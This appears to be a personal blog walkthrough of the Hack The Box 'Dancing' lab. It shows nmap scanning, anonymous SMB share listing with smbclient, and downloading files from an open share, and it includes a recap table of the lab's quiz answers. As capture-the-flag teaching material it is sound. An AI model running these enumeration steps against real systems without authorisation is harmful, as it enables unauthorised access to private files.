# 🕺 Dancing | Hack The Box  
Note: I’m not an expert. I’m writing this blog just to document my learning journey. 🚀

---

## 🔧 Step 1: Connect to Hack The Box

First, connect your system to the HTB VPN using the `.ovpn` config file.

```
sudo openvpn htb.ovpn
```

Wait for the message:
`Initialization Sequence Completed`

---

## 🎯 Step 2: Get the Target IP

Click **Spawn Machine** on the HTB site to get the target IP.
Example IP:

```
10.129.22.153
```

---

## 🔍 Step 3: Scan with Nmap

Use Nmap to find open ports and running services:

```
nmap -A 10.129.22.153
```

### Key Results:

- Port 135 – msrpc
- Port 139 – netbios-ssn
- Port 445 – microsoft-ds (SMB)

This confirms SMB is running on the target.

---

## 📦 Step 4: What Is SMB?

**SMB (Server Message Block)** is a protocol used to share files and printers over a network — mostly on Windows systems.

---

## 🧰 Step 5: Install smbclient

`smbclient` lets us access SMB shares from the terminal.

Install it:

```
sudo apt update
sudo apt install smbclient
```

---

## 📂 Step 6: List Available Shares

Use `smbclient` to list the shares:

```
smbclient -L \\\\10.129.22.153\\ -N
```

### Output:

```
ADMIN$
C$
IPC$
WorkShares
```

We’ll explore `WorkShares` — the only one that might be accessible.

---

## 🔓 Step 7: Access WorkShares

```
smbclient \\\\10.129.22.153\\WorkShares -N
```

Then list the contents:

```
ls
```

Output:

```
Amy.J
James.P
```

---

## 📁 Step 8: Explore & Download Files

### 1. Get worknotes from Amy.J

```
cd Amy.J
ls
get worknotes.txt
```

### 2. Get the flag from James.P

```
cd ..
cd James.P
ls
get flag.txt
exit
```

---

## 📜 Step 9: Read the Flag

```
cat flag.txt
```

Output:

```
<FLAG REDACTED>
```

---

## ✅ Recap

| Question                             | Answer               |
| ------------------------------------ | -------------------- |
| What does SMB stand for?             | Server Message Block |
| What port does SMB use?              | 445                  |
| What is the service on port 445?     | microsoft-ds         |
| What flag lists shares in smbclient? | -L                   |
| How many shares are listed?          | 4                    |
| Which share is accessible?           | WorkShares           |
| Command to download a file?          | get                  |
| Final flag?                          | <FLAG REDACTED>      |

---

## 🎉 Conclusion

This box teaches basic SMB enumeration and shows how anonymous access to file shares can lead to information leaks.

Perfect starting point for anyone new to penetration testing.

---
